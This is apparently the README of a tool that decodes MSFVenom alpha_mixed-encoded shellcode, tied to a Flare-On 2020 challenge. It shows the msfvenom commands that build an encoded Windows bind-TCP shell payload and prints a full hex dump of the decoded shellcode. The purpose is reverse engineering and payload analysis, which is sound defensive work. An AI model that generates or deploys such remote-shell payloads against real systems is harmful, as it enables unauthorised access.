# msfcure
Script for extracting MSFVenom alpha encoded shellcode


In the 2020 Flare-On challenge 7, there was a particularly interesting PCAP challenge that had alpha encoded shellcode needing reverse engineering.

The following reference https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/ explains how shellcode can be encoded using the following sample commands:
```
msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed
msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX
```

I tested the tool as follows:
1. Create sample shellcode using msfvenom and compute the MD5
```
$ msfvenom -a x86 --platform windows -p windows/shell/bind_tcp | md5sum
No encoder specified, outputting raw payload
Payload size: 309 bytes

9d1afa317810b4696498a67b46df37c2  -
```
The MD5 `9d1afa317810b4696498a67b46df37c2` is a reference md5sum for the unencoded shellcode.

2. Confirm that the Alphanumeric encoder generates "random" shellcode each time. I tested it by running this command a few times:

```
$ msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX | md5sum
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 671 (iteration=0)
x86/alpha_mixed chosen with final size 671
Payload size: 671 bytes

b4bce591c0eea015776664eec6753963  -
$ msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX | md5sum
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 671 (iteration=0)
x86/alpha_mixed chosen with final size 671
Payload size: 671 bytes

86a1225b8638d350d9b881b0e6937bc9  -
$ msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX | md5sum
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 671 (iteration=0)
x86/alpha_mixed chosen with final size 671
Payload size: 671 bytes

91bca0838334944f57df12c45af2d0fe  -
```
3. I wrote the file out to disk:

```
$ msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX > win_shell_bindtcp_alpha_mixed
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 671 (iteration=0)
x86/alpha_mixed chosen with final size 671
Payload size: 671 bytes
```

4. I used the msfcure tool to decode the payload:
```
$ python3 msfcure.py --dump win_shell_bindtcp_alpha_mixed 
win_shell_bindtcp_alpha_mixed: Detected 'rex/encoder/alpha2/alpha_mixed'
00000000: FC E8 82 00 00 00 60 89  E5 31 C0 64 8B 50 30 8B  ......`..1.d.P0.
00000010: 52 0C 8B 52 14 8B 72 28  0F B7 4A 26 31 FF AC 3C  R..R..r(..J&1..<
00000020: 61 7C 02 2C 20 C1 CF 0D  01 C7 E2 F2 52 57 8B 52  a|., .......RW.R
00000030: 10 8B 4A 3C 8B 4C 11 78  E3 48 01 D1 51 8B 59 20  ..J<.L.x.H..Q.Y 
00000040: 01 D3 8B 49 18 E3 3A 49  8B 34 8B 01 D6 31 FF AC  ...I..:I.4...1..
00000050: C1 CF 0D 01 C7 38 E0 75  F6 03 7D F8 3B 7D 24 75  .....8.u..}.;}$u
00000060: E4 58 8B 58 24 01 D3 66  8B 0C 4B 8B 58 1C 01 D3  .X.X$..f..K.X...
00000070: 8B 04 8B 01 D0 89 44 24  24 5B 5B 61 59 5A 51 FF  ......D$$[[aYZQ.
00000080: E0 5F 5F 5A 8B 12 EB 8D  5D 68 33 32 00 00 68 77  .__Z....]h32..hw
00000090: 73 32 5F 54 68 4C 77 26  07 FF D5 B8 90 01 00 00  s2_ThLw&........
000000A0: 29 C4 54 50 68 29 80 6B  00 FF D5 6A 0B 59 50 E2  ).TPh).k...j.YP.
000000B0: FD 6A 01 6A 02 68 EA 0F  DF E0 FF D5 97 68 02 00  .j.j.h.......h..
000000C0: 11 5C 89 E6 6A 10 56 57  68 C2 DB 37 67 FF D5 85  .\..j.VWh..7g...
000000D0: C0 75 58 57 68 B7 E9 38  FF FF D5 57 68 74 EC 3B  .uXWh..8...Wht.;
000000E0: E1 FF D5 57 97 68 75 6E  4D 61 FF D5 6A 00 6A 04  ...W.hunMa..j.j.
000000F0: 56 57 68 02 D9 C8 5F FF  D5 83 F8 00 7E 2D 8B 36  VWh..._.....~-.6
00000100: 6A 40 68 00 10 00 00 56  6A 00 68 58 A4 53 E5 FF  j@h....Vj.hX.S..
00000110: D5 93 53 6A 00 56 53 57  68 02 D9 C8 5F FF D5 83  ..Sj.VSWh..._...
00000120: F8 00 7E 07 01 C3 29 C6  75 E9 C3 BB F0 B5 A2 56  ..~...).u......V
00000130: 6A 00 53 FF D5                                    j.S..
Writing decoded shellcode to win_shell_bindtcp_alpha_mixed.msfcure
```

5. I confirmed that the MD5 of the dumped shellcode matches the reference shellcode:
```
$ md5sum win_shell_bindtcp_alpha_mixed.msfcure 
9d1afa317810b4696498a67b46df37c2  win_shell_bindtcp_alpha_mixed.msfcure
```
